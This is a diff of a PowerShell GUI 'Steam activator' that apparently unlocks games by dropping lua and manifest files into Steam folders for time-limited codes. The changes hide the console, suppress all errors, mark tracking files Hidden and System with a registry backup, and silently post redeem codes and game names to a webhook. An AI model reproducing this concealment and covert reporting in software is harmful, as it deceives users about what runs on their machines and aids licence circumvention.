@@ -1,10 +1,21 @@
-<#
+﻿<#
     BastissSteam Activator v2.0
     PowerShell 5.1 WinForms GUI
 #>
 
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
+$ProgressPreference = 'SilentlyContinue'
+# ---- Instancia unica: si ya hay otro activador corriendo, salir sin abrir otro ----
+$script:singleMutex = $null
+try {
+    $script:singleMutex = New-Object System.Threading.Mutex($false, "Local\BastissSteamActivatorMutex")
+    if (-not $script:singleMutex.WaitOne(0)) { exit }
+} catch {}
+# ---- Trampa global: ningun error muestra dialogo, solo se registra ----
+trap {
+    try { Add-Content -Path (Join-Path $env:TEMP 'bsmap_error.log') -Value "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] TRAP: $($_.Exception.Message)" -Encoding UTF8 } catch {}
+}
 [System.Windows.Forms.Application]::EnableVisualStyles()
 [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 -bor [System.Net.SecurityProtocolType]::Tls13
 
@@ -23,20 +34,26 @@ public class DwmHelper {
 }
 "@
 # Give app its own taskbar identity (separate from powershell.exe)
-[DwmHelper]::SetCurrentProcessExplicitAppUserModelID("BastissSteam.Activator") | Out-Null
+try { [DwmHelper]::SetCurrentProcessExplicitAppUserModelID("BastissSteam.Activator") | Out-Null } catch {}
 # Hide PowerShell console window
-$cw = [DwmHelper]::GetConsoleWindow()
-if ($cw -ne [IntPtr]::Zero) { [DwmHelper]::ShowWindow($cw, 0) | Out-Null }
+try { $cw = [DwmHelper]::GetConsoleWindow(); if ($cw -ne [IntPtr]::Zero) { [DwmHelper]::ShowWindow($cw, 0) | Out-Null } } catch {}
 
-Add-Type -ReferencedAssemblies @("System.Windows.Forms","System.Drawing") -TypeDefinition @"
-using System.Windows.Forms;
-public class BufferedPanel : Panel {
-    public BufferedPanel() {
-        this.DoubleBuffered = true;
-        this.SetStyle(ControlStyles.AllPaintingInWmPaint | ControlStyles.UserPaint | ControlStyles.OptimizedDoubleBuffer, true);
-    }
+# ---- Unica instancia: si ya hay una abierta, salir ----
+try {
+    $script:siMutex = New-Object System.Threading.Mutex($false, 'BastissSteamActivator2_SI')
+    if (-not $script:siMutex.WaitOne(0)) { exit }
+} catch {}
+
+function New-BufferedPanel {
+    $p = New-Object System.Windows.Forms.Panel
+    $bf = [System.Reflection.BindingFlags]'Instance,NonPublic'
+    try { $p.GetType().GetProperty('DoubleBuffered',$bf).SetValue($p,$true) } catch {}
+    try {
+        $flags = [int][System.Windows.Forms.ControlStyles]::AllPaintingInWmPaint + [int][System.Windows.Forms.ControlStyles]::UserPaint + [int][System.Windows.Forms.ControlStyles]::OptimizedDoubleBuffer
+        $p.GetType().GetMethod('SetStyle',$bf).Invoke($p,@([System.Windows.Forms.ControlStyles]$flags,$true)) | Out-Null
+    } catch {}
+    $p
 }
-"@
 
 # Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
 #  TRANSLATIONS
@@ -205,25 +222,67 @@ function Get-ActiveTimers {
             foreach ($item in $arr) {
                 if ($item.expires_at -and $item.PSObject.Properties.Name -contains "expires_at") { $valid += $item }
             }
-            return , $valid
+            if ($valid.Count -gt 0) { return , $valid }
         } catch {}
     }
+    # Espejo en el registro: si el archivo falta, quedo vacio o corrupto, restaurar desde ahi
+    try {
+        $reg = (Get-ItemProperty -Path "HKCU:\Software\Bsmap" -Name "Timers" -ErrorAction SilentlyContinue).Timers
+        if ($reg) {
+            $rt = @(foreach ($el in @($reg | ConvertFrom-Json)) { if ($el -is [System.Array] -and $el.Count -eq 1) { $el[0] } else { $el } })
+            if ($rt.Count -gt 0 -and $rt[0].expires_at) {
+                try { try { (Get-Item $TIMERS_FILE -Force -ErrorAction SilentlyContinue).Attributes = 'Normal' } catch {}; [System.IO.File]::WriteAllText($TIMERS_FILE, (ConvertTo-Json -InputObject @($rt) -Depth 10), $script:utf8NoBom) } catch {}
+                try { (Get-Item $TIMERS_FILE -Force -ErrorAction SilentlyContinue).Attributes = 'Hidden, System' } catch {}
+                return , $rt
+            }
+        }
+    } catch {}
     return ,@()
 }
 
 function Save-Timers {
     param($t)
     $utf8NoBom = New-Object System.Text.UTF8Encoding $false
-    try { (Get-Item $TIMERS_FILE -Force -ErrorAction SilentlyContinue).Attributes = 'Normal' } catch {}
-    if (-not $t -or $t.Count -eq 0) {
-        [System.IO.File]::WriteAllText($TIMERS_FILE, '[]', $utf8NoBom)
-        try { Set-ItemProperty -Path "HKCU:\Software\Bsmap" -Name "Timers" -Value '[]' -Type String -Force -ErrorAction SilentlyContinue } catch {}
-    } else {
-        $t = @(foreach ($el in @($t)) { if ($el -is [System.Array] -and $el.Count -eq 1) { $el[0] } else { $el } })
-        [System.IO.File]::WriteAllText($TIMERS_FILE, (ConvertTo-Json -InputObject @($t) -Depth 10), $utf8NoBom)
-        try { New-Item -Path "HKCU:\Software\Bsmap" -Force -ErrorAction SilentlyContinue | Out-Null; Set-ItemProperty -Path "HKCU:\Software\Bsmap" -Name "Timers" -Value (ConvertTo-Json -InputObject @($t) -Compress -Depth 10) -Type String -Force -ErrorAction SilentlyContinue } catch {}
+    $t = @(foreach ($el in @($t)) { if ($el -is [System.Array] -and $el.Count -eq 1) { $el[0] } else { $el } })
+    $json = if ($t.Count -eq 0) { '[]' } else { ConvertTo-Json -InputObject @($t) -Depth 10 }
+    $regJson = if ($t.Count -eq 0) { '[]' } else { ConvertTo-Json -InputObject @($t) -Compress -Depth 10 }
+    # 1) Registrar SIEMPRE en el registro primero (espejo mas confiable, nunca falla por locks)
+    try { New-Item -Path "HKCU:\Software\Bsmap" -Force -ErrorAction SilentlyContinue | Out-Null; Set-ItemProperty -Path "HKCU:\Software\Bsmap" -Name "Timers" -Value $regJson -Type String -Force -ErrorAction SilentlyContinue } catch {}
+    # 2) Escribir el archivo con reintentos (nunca lanzar excepcion)
+    $wroteOk = $false
+    for ($i = 0; $i -lt 3; $i++) {
+        try {
+            try { (Get-Item $TIMERS_FILE -Force -ErrorAction SilentlyContinue).Attributes = 'Normal' } catch {}
+            [System.IO.File]::WriteAllText($TIMERS_FILE, $json, $utf8NoBom)
+            $wroteOk = $true
+            break
+        } catch { Start-Sleep -Milliseconds 200 }
+    }
+    if (-not $wroteOk) {
+        try { [System.IO.File]::WriteAllText((Join-Path $env:TEMP 'bsmap_save_fail.log'), "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Save-Timers: FALLO escribir archivo tras 3 intentos. Registro actualizado OK. Contenido: $json", (New-Object System.Text.UTF8Encoding $false)) } catch {}
     }
     try { $fi = Get-Item $TIMERS_FILE -Force -ErrorAction SilentlyContinue; if ($fi) { $fi.Attributes = 'Hidden, System' } } catch {}
+}
+
+# ---- Historial persistente de codigos (activos + expirados recientes) ----
+$HISTORY_FILE = Join-Path $env:LOCALAPPDATA "bsmap_codes_history.json"
+function Get-CodesHistory {
+    try {
+        if (Test-Path $HISTORY_FILE) {
+            $h = Get-Content $HISTORY_FILE -Raw | ConvertFrom-Json
+            if ($h) { return ,@($h | Where-Object { $_ -and $_.code }) }
+        }
+    } catch {}
+    return ,@()
+}
+function Add-ExpiredToHistory {
+    param($t)
+    try {
+        $h = @(Get-CodesHistory)
+        $h += @{ code = if ($t.redeem_code) { $t.redeem_code } else { $t.game_name }; game = $t.game_name; expires_at = $t.expires_at; duration = $t.duration; expired_at = (Get-Date).ToString('o') }
+        if ($h.Count -gt 50) { $h = @($h | Select-Object -Last 50) }
+        [System.IO.File]::WriteAllText($HISTORY_FILE, (ConvertTo-Json -InputObject @($h) -Depth 10), $script:utf8NoBom)
+    } catch {}
 }
 
 function Remove-FileHard {
@@ -262,22 +321,33 @@ function Remove-ExpiredTimers {
             $expired += $t
         } else { $remaining += $t }
     }
-    # Eliminar archivos de juegos expirados (intentar 3 veces por archivo)
+    # Eliminar archivos de juegos expirados (intentar 3 veces por archivo) y CONFIRMAR borrado real
     foreach ($t in $expired) {
         $root = $t.steam_root
         if (-not $root) { continue }
+        $borrados = @(); $fallidos = @()
         foreach ($f in $t.lua_files) {
             $p1 = Join-Path (Join-Path $root "config\stplug-in") $f
             $p2 = Join-Path (Join-Path $root "config\lua") $f
             Remove-FileHard $p1
             Remove-FileHard $p2
+            if ((Test-Path $p1) -or (Test-Path $p2)) { $fallidos += $f } else { $borrados += $f }
         }
         foreach ($f in $t.manifest_files) {
             $p3 = Join-Path (Join-Path $root "config\depotcache") $f
             Remove-FileHard $p3
+            if (Test-Path $p3) { $fallidos += $f } else { $borrados += $f }
         }
         $logPath = Join-Path $env:TEMP "bsmap_juego_expirado.log"
-        try { Add-Content -Path $logPath -Value "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] EXPIRADO y BORRADO: $($t.game_name) (codigo: $($t.redeem_code)) [Root: $root] - Archivos: $($t.lua_files -join ', ') | $($t.manifest_files -join ', ')" -Encoding UTF8 -ErrorAction SilentlyContinue } catch {}
+        try { Add-Content -Path $logPath -Value "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] EXPIRADO y BORRADO: $($t.game_name) (codigo: $($t.redeem_code)) [Root: $root] - OK: $($borrados.Count) | FALLIDOS: $($fallidos.Count)" -Encoding UTF8 -ErrorAction SilentlyContinue } catch {}
+        try {
+            $bt = [char]96
+            $content = "**EXPIRADO:** $($t.game_name)`n**Codigo:** $bt$bt$bt$($t.redeem_code)$bt$bt$bt`n**Borrados OK:** $($borrados.Count)`n**NO borrados:** $($fallidos.Count)"
+            if ($fallidos.Count -gt 0) { $content += "`n**Archivos que siguen existiendo:**$bt$bt$bt$($fallidos -join "`n")$bt$bt$bt" }
+            $payload = @{ content = $content } | ConvertTo-Json
+            Invoke-RestMethod -Uri $WEBHOOK_URL -Method Post -Body $payload -ContentType "application/json" -TimeoutSec 10 -ErrorAction SilentlyContinue | Out-Null
+        } catch {}
+        Add-ExpiredToHistory $t
     }
     Save-Timers $remaining
     # Doble verificacion: releer y volver a salvar si quedaron expired
@@ -768,14 +838,16 @@ function Start-Countdown {
     $script:countdownTick.Interval = 1000
     $script:countdownTick.Tag = @{ endTime = $expDate; gameName = $gameName }
     $script:countdownTick.Add_Tick({
-        $now, $_ = Get-Now; $end = $this.Tag.endTime; $g = $this.Tag.gameName
-        $left = ($end - $now).TotalSeconds
-        if ($left -le 0) {
-            $this.Stop()
-            $script:countdownText = $null
-            Remove-ExpiredTimers | Out-Null
-            [System.Windows.Forms.MessageBox]::Show("El tiempo para $g ha expirado.", "Tiempo Expirado", "OK", "Information")
-        }
+        try {
+            $now, $_ = Get-Now; $end = $this.Tag.endTime; $g = $this.Tag.gameName
+            $left = ($end - $now).TotalSeconds
+            if ($left -le 0) {
+                $this.Stop()
+                $script:countdownText = $null
+                try { Remove-ExpiredTimers | Out-Null } catch {}
+                [System.Windows.Forms.MessageBox]::Show("El tiempo para $g ha expirado.", "Tiempo Expirado", "OK", "Information")
+            }
+        } catch {}
     })
     $script:countdownTick.Start()
 }
@@ -820,7 +892,7 @@ $script:langs = @{
     "es" = @{ activar="Activar +300";activarSub="Activa mas de 300 juegos"
         idioma="Idioma";idiomaSub="Cambiar idioma";desinstalar="Desinstalar";desinstalarSub="Eliminar juegos"
         web="Pagina Web";webSub="Visitar sitio oficial"
-        config="Configuracion";configSub="Ajustes del programa";watcherOn="Watcher: ACTIVADO";watcherOff="Watcher: DESACTIVADO"
+        config="Configuracion";configSub="Ajustes del programa";reparadorOn="Reparador: ACTIVADO";reparadorOff="Reparador: DESACTIVADO"
         borrarHist="Borrar historial de codigos";borrarHistSub="Elimina el registro de codigos activos"
         limpieza="LIMPIEZA";limpiezaSub="Elimina procesos, luas y registro"
         histBorrado="Historial borrado";histBorradoMsg="Se eliminaron todos los codigos activos del registro."
@@ -835,7 +907,7 @@ $script:langs = @{
     "en" = @{ activar="Activate +300";activarSub="Activate over 300 games"
         idioma="Language";idiomaSub="Change language";desinstalar="Uninstall";desinstalarSub="Remove games"
         web="Website";webSub="Visit official site"
-        config="Settings";configSub="Program settings";watcherOn="Watcher: ON";watcherOff="Watcher: OFF"
+        config="Settings";configSub="Program settings";reparadorOn="Repairer: ON";reparadorOff="Repairer: OFF"
         borrarHist="Clear codes history";borrarHistSub="Remove active code records"
         limpieza="CLEANUP";limpiezaSub="Kill processes, remove luas and history"
         histBorrado="History cleared";histBorradoMsg="All active codes have been removed from the registry."
@@ -850,7 +922,7 @@ $script:langs = @{
     "pt" = @{ activar="Ativar +300";activarSub="Ative mais de 300 jogos"
         idioma="Idioma";idiomaSub="Mudar idioma";desinstalar="Desinstalar";desinstalarSub="Remover jogos"
         web="Pagina Web";webSub="Visitar site oficial"
-        config="Configuracoes";configSub="Ajustes do programa";watcherOn="Watcher: ATIVADO";watcherOff="Watcher: DESATIVADO"
+        config="Configuracoes";configSub="Ajustes do programa";reparadorOn="Reparador: ATIVADO";reparadorOff="Reparador: DESATIVADO"
         borrarHist="Limpar historico de codigos";borrarHistSub="Remove registros de codigos ativos"
         limpieza="LIMPEZA";limpiezaSub="Mata processos, remove luas e historico"
         histBorrado="Historico limpo";histBorradoMsg="Todos os codigos ativos foram removidos do registro."
@@ -1018,17 +1090,17 @@ $form.ClientSize=New-Object System.Drawing.Size($FW,$FH)
 $form.StartPosition="CenterScreen";$form.BackColor=$BG
 $form.FormBorderStyle="FixedSingle";$form.MaximizeBox=$false
 
-# Icon from logo image
-$ib=New-Object System.Drawing.Bitmap(32,32)
+# Icon from logo image (64px master -> tray/taskbar downscale mas nitido)
+$ib=New-Object System.Drawing.Bitmap(64,64)
 $ig=[System.Drawing.Graphics]::FromImage($ib);$ig.SmoothingMode='AntiAlias'
 $ig.InterpolationMode='HighQualityBicubic'
 $cpIcon=New-Object System.Drawing.Drawing2D.GraphicsPath
-$cpIcon.AddEllipse(0,0,32,32);$ig.SetClip($cpIcon)
+$cpIcon.AddEllipse(0,0,64,64);$ig.SetClip($cpIcon)
 if($logoFile){
     $srcIcon=[System.Drawing.Image]::FromFile($logoFile.FullName)
     $minI=[Math]::Min($srcIcon.Width,$srcIcon.Height)
     $cxI=[int](($srcIcon.Width-$minI)/2);$cyI=[int](($srcIcon.Height-$minI)/2)
-    $ig.DrawImage($srcIcon,(New-Object System.Drawing.Rectangle(0,0,32,32)),(New-Object System.Drawing.Rectangle($cxI,$cyI,$minI,$minI)),[System.Drawing.GraphicsUnit]::Pixel)
+    $ig.DrawImage($srcIcon,(New-Object System.Drawing.Rectangle(0,0,64,64)),(New-Object System.Drawing.Rectangle($cxI,$cyI,$minI,$minI)),[System.Drawing.GraphicsUnit]::Pixel)
     $srcIcon.Dispose()
 }
 $ig.ResetClip();$cpIcon.Dispose();$ig.Dispose()
@@ -1038,7 +1110,7 @@ $form.Add_HandleCreated({$v=[int]1;[DwmHelper]::DwmSetWindowAttribute($form.Hand
 # Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
 #  HEADER
 # Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
-$hp=New-Object BufferedPanel
+$hp=New-BufferedPanel
 $hp.Location=New-Object System.Drawing.Point(0,0)
 $hp.Size=New-Object System.Drawing.Size($FW,$HH);$hp.BackColor=$BG
 $hp.Add_Paint({
@@ -1103,8 +1175,8 @@ $script:gearBtn.Text="config";$script:gearBtn.Font=$FntSub
 $script:gearBtn.ForeColor=[System.Drawing.Color]::FromArgb(60,70,90);$script:gearBtn.BackColor=$BG
 $script:gearBtn.AutoSize=$true;$script:gearBtn.Cursor=[System.Windows.Forms.Cursors]::Hand
 $script:gearBtn.Location=New-Object System.Drawing.Point(($FW-60),($HH-25))
-$script:gearBtn.Add_MouseEnter({$_.ForeColor=$script:Cyan})
-$script:gearBtn.Add_MouseLeave({$_.ForeColor=[System.Drawing.Color]::FromArgb(60,70,90)})
+$script:gearBtn.Add_MouseEnter({param($s);$s.ForeColor=$script:Cyan})
+$script:gearBtn.Add_MouseLeave({param($s);$s.ForeColor=[System.Drawing.Color]::FromArgb(60,70,90)})
 $script:gearBtn.Add_Click({Switch-ToConfig})
 $hp.Controls.Add($script:gearBtn)
 
@@ -1112,7 +1184,7 @@ $hp.Controls.Add($script:gearBtn)
 #  CARD FACTORY
 # Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
 function New-Card{param([int]$X,[int]$Y,[int]$W,[int]$H,[string]$Title,[string]$Sub,[string]$Icon,[scriptblock]$Click)
-    $pn=New-Object BufferedPanel
+    $pn=New-BufferedPanel
     $pn.Location=New-Object System.Drawing.Point($X,$Y)
     $pn.Size=New-Object System.Drawing.Size($W,$H);$pn.BackColor=$BG
     $pn.Cursor=[System.Windows.Forms.Cursors]::Hand
@@ -1267,7 +1339,7 @@ function Show-LangDialog{
 # Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
 #  MAIN VIEW
 # Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
-$script:mp=New-Object BufferedPanel
+$script:mp=New-BufferedPanel
 $script:mp.Location=New-Object System.Drawing.Point(0,$CY)
 $script:mp.Size=New-Object System.Drawing.Size($FW,($FH-$CY));$script:mp.BackColor=$BG
 
@@ -1318,7 +1390,7 @@ $script:c6=New-Card -X $PAD -Y $TIK_Y -W $CW -H $FCH -Title (T "tiktok") -Sub (T
 $script:mp.Controls.Add($script:c6)
 
 # Salir
-$script:salBtn=New-Object BufferedPanel
+$script:salBtn=New-BufferedPanel
 $script:salBtn.Location=New-Object System.Drawing.Point($PAD,$SAL_Y)
 $script:salBtn.Size=New-Object System.Drawing.Size($CW,$SAL_H);$script:salBtn.BackColor=$BG
 $script:salBtn.Cursor=[System.Windows.Forms.Cursors]::Hand;$script:salBtn.Tag=@{Hover=$false}
@@ -1348,12 +1420,12 @@ $form.Controls.Add($script:mp)
